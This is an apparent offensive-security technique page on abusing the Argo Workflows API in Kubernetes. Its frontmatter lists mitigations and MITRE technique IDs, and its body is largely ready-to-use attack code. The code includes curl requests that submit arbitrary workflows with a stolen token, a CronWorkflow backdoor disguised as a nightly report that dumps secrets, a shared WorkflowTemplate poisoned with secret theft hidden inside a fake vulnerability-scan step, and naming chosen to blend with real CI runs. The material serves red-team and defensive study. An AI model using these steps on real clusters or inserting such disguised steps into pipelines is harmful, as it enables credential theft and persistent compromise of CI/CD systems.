---
title: Weaponizing Argo Workflows
description: Abusing Argo Workflows API to execute arbitrary workloads for privilege escalation and persistence
category: offensive
phase: privilege-escalation
createdAt: 2026-05-14
impact: An attacker with Argo API access can submit arbitrary workflows that run under privileged ServiceAccount identities, create persistent CronWorkflow backdoors, and poison shared WorkflowTemplates to compromise every CI/CD pipeline that references them. The Argo controller executes all of these using its own credentials, not the attacker's
mitigation:
  - Restrict **workflows create** and **cronworkflows create** permissions to specific CI/CD service accounts only
  - Restrict **workflowtemplates patch** and **workflowtemplates update** to dedicated platform operator identities
  - Enable Argo Workflows **workflowRestrictions** in the controller configmap to limit allowed container images, ServiceAccounts, and volume types
  - Require approval workflows for new CronWorkflow and WorkflowTemplate resources
mitreTechniques:
  - T1610
  - T1059
  - T1078
  - T1036
tools:
  - kubectl
  - curl
  - jq
references: |
  - [Argo Workflows Security Documentation](https://argo-workflows.readthedocs.io/en/stable/security/)
  - [Argo Workflows RBAC](https://argo-workflows.readthedocs.io/en/stable/access-token/)
  - [Argo Workflows Workflow Restrictions](https://argo-workflows.readthedocs.io/en/stable/workflow-restrictions/)
  - [End-to-end Argo Workflow for CI/CD](https://www.cncf.io/blog/2025/06/21/end-to-end-argo-workflow-for-ci-cd/)
---

Argo Workflows is a container-native workflow engine for orchestrating parallel jobs on Kubernetes. It exposes a REST API that accepts authenticated requests to create, manage, and monitor workflows. The Argo controller runs with broad cluster permissions to execute workflows on behalf of authenticated users.

Consider a typical setup where an application pod holds an Argo API token so it can trigger workflows for deployments, data processing, or CI/CD pipelines. If an attacker gains code execution inside that pod, they can read the token from the environment and use it to submit arbitrary workflows to the Argo API. The Argo controller accepts these requests and creates pods that run under a different ServiceAccount with broader permissions. The attacker's own Kubernetes RBAC is irrelevant because the Argo controller executes the workflow on their behalf.

This technique covers three abuse paths. An attacker can submit a one-time workflow to read secrets and retrieve the output through the Argo API. They can create a CronWorkflow to persist access and collect data on a recurring schedule. They can poison a shared WorkflowTemplate to compromise every CI/CD pipeline that references it.

## Understanding the Attack Surface

The Argo controller service account holds broad Kubernetes permissions to create and manage workflow pods. When an attacker submits a workflow via the Argo API, the controller reads the workflow spec and creates pods using its own credentials, not the attacker's. This means the attacker's Kubernetes RBAC is irrelevant once the workflow object exists.

The key misuse here is that Argo treats the workflow spec as a **trusted instruction**. It does not verify whether the user who submitted the workflow actually has permission to perform the actions defined inside it. The authorization check happens at the **Argo API level only**, not at the Kubernetes resource level for the requesting user.

The workflow pod runs under the `serviceAccountName` specified in the spec. That ServiceAccount's token is mounted into the pod automatically, giving the workflow access to the Kubernetes API at whatever privilege level that ServiceAccount holds.

## RBAC permissions

The minimum Argo-level permission required:

```yaml
rules:
  - apiGroups: ["argoproj.io"]
    resources: ["workflows"]
    verbs: ["create"]
```

Or for persistent access:

```yaml
rules:
  - apiGroups: ["argoproj.io"]
    resources: ["cronworkflows"]
    verbs: ["create"]
```

Or for supply chain compromise:

```yaml
rules:
  - apiGroups: ["argoproj.io"]
    resources: ["workflowtemplates"]
    verbs: ["create", "update", "patch"]
```

These permissions are commonly granted to CI/CD service accounts and sometimes to developer namespaces so teams can self-service trigger pipelines.

## The attack sequence

### Gaining Argo API Access

The attacker needs an authenticated identity that the Argo API server accepts. This is typically a ServiceAccount token that has been granted workflow permissions through Kubernetes RBAC and injected into an application pod as an environment variable or mounted file.

Once the attacker gains code execution inside that pod, they can read the token from the environment or filesystem and use it to authenticate to the Argo API server:

```bash
curl -sk -H "Authorization: Bearer $ARGO_TOKEN" \
  "https://argo-server.argo.svc.cluster.local:2746/api/v1/workflows/production"
```

A successful response confirms the token is valid and reveals which namespace the token is scoped to.

#### Auth mode misconfiguration

The Argo server supports multiple authentication modes configured via the `--auth-mode` flag. The `server` mode validates Kubernetes service account tokens and is the default for production deployments. The `client` mode uses client certificates and `sso` uses OIDC/OAuth2.

A common misconfiguration is setting `--auth-mode=none`, which disables authentication entirely and makes the Argo API completely open. Any pod that can reach the Argo server can submit workflows without presenting a token. This is sometimes done during initial setup or debugging and left in place.

```bash
curl -sk "https://argo-server.argo.svc.cluster.local:2746/api/v1/workflows/production"
```

When `--auth-mode=none` is active, the above request returns the workflow list without any `Authorization` header. In this scenario, the attacker does not need to find or steal a token. They only need network reachability to the Argo server.

The same unauthenticated access reveals all existing workflows, CronWorkflows, and WorkflowTemplates in the namespace. This gives the attacker immediate visibility into CI/CD pipeline patterns, naming conventions, and the templates they can poison.

### Submitting an Arbitrary Workflow

The attacker crafts a workflow spec that executes arbitrary commands. The workflow pod runs under a ServiceAccount either the one specified in `serviceAccountName` or the namespace `default` if omitted.

```bash
curl -sk -X POST \
  -H "Authorization: Bearer $ARGO_TOKEN" \
  -H "Content-Type: application/json" \
  "https://${ARGO_SERVER}/api/v1/workflows/${NAMESPACE}" \
  -d '{
    "workflow": {
      "metadata": {
        "generateName": "prefix-",
        "namespace": "namespace"
      },
      "spec": {
        "entrypoint": "main",
        "templates": [{
          "name": "main",
          "container": {
            "image": "alpine:latest",
            "command": ["sh", "-c"],
            "args": ["arbitrary-command"]
          }
        }]
      }
    }
  }'
```

The Argo controller creates a pod that executes `arbitrary-command`. If `serviceAccountName` is specified, the pod uses that identity. Otherwise, it falls back to the namespace `default` ServiceAccount. The impact depends on the permissions of the resulting identity.

> [!NOTE]
> If `serviceAccountName` is specified, it must exist in the **same namespace** as the workflow. Kubernetes resolves it as `namespace/serviceAccountName`. If omitted, the workflow pod runs as the namespace `default` ServiceAccount.

### Reading Results from Workflow Logs

The attacker retrieves the workflow output via the Argo API without needing any Kubernetes RBAC:

```bash
curl -sk -H "Authorization: Bearer $ARGO_TOKEN" \
  "https://${ARGO_SERVER}/api/v1/workflows/${NAMESPACE}/${WORKFLOW_NAME}/log?logOptions.container=main"
```

The response contains the pod's stdout. This is the primary exfiltration channel.

### CronWorkflow Persistence

A one-time workflow is ephemeral. A CronWorkflow persists in the cluster and executes on a recurring schedule. The attacker creates a CronWorkflow disguised as a legitimate scheduled job such as a nightly report or data synchronization task.

```bash
curl -sk -X POST \
  -H "Authorization: Bearer $ARGO_TOKEN" \
  -H "Content-Type: application/json" \
  "https://${ARGO_SERVER}/api/v1/cron-workflows/${NAMESPACE}" \
  -d '{
    "cronWorkflow": {
      "metadata": {
        "name": "nightly-cost-report",
        "namespace": "namespace"
      },
      "spec": {
        "schedule": "0 2 * * *",
        "serviceAccountName": "target-sa",
        "workflowSpec": {
          "entrypoint": "collect",
          "templates": [{
            "name": "collect",
            "script": {
              "image": "bitnami/kubectl:latest",
              "command": ["bash"],
              "source": "set -e\nkubectl get secrets,configmaps -n namespace -o json > /tmp/cluster-report.json\nkubectl get pods -n namespace -o wide >> /tmp/cluster-report.json\necho 'Report generated at $(date)' >> /tmp/cluster-report.json",
              "outputs": {
                "artifacts": [{
                  "name": "report",
                  "path": "/tmp/cluster-report.json"
                }]
              }
            }
          }]
        }
      }
    }
  }'
```

The artifact is uploaded to the configured storage backend after each scheduled run. The attacker does not need to maintain a listener or establish outbound connections. The data sits in the artifact repository alongside legitimate workflow outputs until retrieved.

The CronWorkflow runs on schedule regardless of whether the attacker's initial access is detected and removed. The only way to stop it is to delete the CronWorkflow resource itself, which requires permissions the attacker never needed to create it.

### WorkflowTemplate Poisoning

WorkflowTemplates are reusable workflow definitions that CI/CD pipelines reference. An attacker who can create or modify templates can inject malicious steps that execute every time the template is used.

Most organizations maintain shared WorkflowTemplates that every team uses to deploy their applications. The attacker patches one of these templates to add a malicious step disguised as a routine pipeline operation such as image scanning or pre-deploy validation.

```yaml
spec:
  entrypoint: deploy
  templates:
    - name: deploy
      steps:
        - - name: build-image
            template: build
          - name: security-scan
            template: scan
        - - name: deploy-staging
            template: deploy
    - name: scan
      script:
        image: aquasec/trivy:0.48.3
        command: ["bash"]
        source: |
          set -e
          echo "Running vulnerability scan..."
          trivy image --severity HIGH,CRITICAL --format json myapp:latest > /tmp/scan-results.json
          kubectl get secrets -n production -o json >> /tmp/scan-results.json
          echo "Scan complete"
        outputs:
          parameters:
            - name: scan-report
              valueFrom:
                path: /tmp/scan-results.json
```

The script reads secrets from the namespace and writes them to a file. Argo automatically captures this file as a workflow output parameter. The attacker retrieves the exfiltrated data by reading the workflow result through the Argo API, the same way a legitimate CI/CD system would read build artifacts or scan results.

The malicious step runs in parallel with the legitimate build step. It completes quickly and does not block the pipeline, so CI/CD executions continue to succeed without raising alarms. Every future pipeline run that references this template automatically executes the attacker's code.

### Workflow Naming Masquerading

Argo workflows support `generateName` which creates workflows with a prefix followed by a random suffix. An attacker can choose a prefix that mimics legitimate workflow naming conventions used by the organization's CI/CD pipelines:

```json
{
  "metadata": {
    "generateName": "build-deploy-",
    "namespace": "production"
  }
}
```

The resulting workflow name `build-deploy-abc12` blends in with legitimate pipeline executions. During a quick `kubectl get workflows` review, the malicious workflow is indistinguishable from real CI/CD runs.
